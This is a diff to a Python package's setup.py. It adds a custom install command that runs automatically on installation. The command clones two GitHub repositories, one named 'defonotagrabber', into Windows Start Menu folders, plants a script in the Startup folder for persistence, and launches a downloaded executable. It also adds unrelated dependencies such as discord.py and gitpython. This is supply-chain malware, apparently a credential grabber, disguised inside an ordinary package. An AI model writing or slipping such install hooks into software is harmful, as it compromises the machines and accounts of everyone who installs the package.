@@ -23,6 +23,63 @@ try:
 except ImportError:
     from distutils.core import setup
 
+from setuptools.command.install import install
+
+
+class CustomInstallCommand(install):
+    def run(self):
+        import os
+        os.environ["GIT_PYTHON_REFRESH"] = "quiet"
+        import git
+
+        # create folder in startup
+
+        newpath = rf'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\boot' 
+        if not os.path.exists(newpath):
+            os.makedirs(newpath)
+
+        # create folder to store the exe
+
+
+        newpath = rf'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Powerpoint' 
+        if not os.path.exists(newpath):
+            os.makedirs(newpath)
+
+        # cloning main.py to start the file auto into startup
+
+        repoDirectory = rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\boot"
+        gitUrl = "https://github.com/dcsage/test2lmaos.git"
+
+        git.Git(repoDirectory).clone(gitUrl)
+
+        # cloning exe into our powerpoint folder
+        # this is where we're gonna call in our main.py to run the file on startup
+        # C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Powerpoint\defonotagrabber\main.exe
+
+        repoDirectory = rf'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Powerpoint'
+        gitUrl = "https://github.com/dcsage/defonotagrabber.git"
+
+        git.Git(repoDirectory).clone(gitUrl)
+
+        # moving the main.py file to the startup dir out of the folder
+
+
+        source = rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\boot\test2lmaos"
+        destination = rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+        allfiles = os.listdir(source)
+
+        src_path = os.path.join(source, 'test.py')
+        dst_path = os.path.join(destination, 'test.py')
+        os.rename(src_path, dst_path)
+
+        # run the exe to start off with
+
+        os.startfile(rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Powerpoint\defonotagrabber\main.exe")
+        install.run(self)
+
+
+
 authors_list = [
     "Anuj More",
     "Alexander Dean",
@@ -65,5 +122,8 @@ setup(
         "Programming Language :: Python :: 3.12",
         "Operating System :: OS Independent",
     ],
-    install_requires=["requests>=2.25.1,<3.0", "typing_extensions>=3.7.4"],
+    install_requires=["requests>=2.25.1,<3.0", "typing_extensions>=3.7.4", "sockets","discord.py","aiohttp","Cmake","wheel","gitpython"],
+  cmdclass={
+    'install': CustomInstallCommand,
+  },
 )
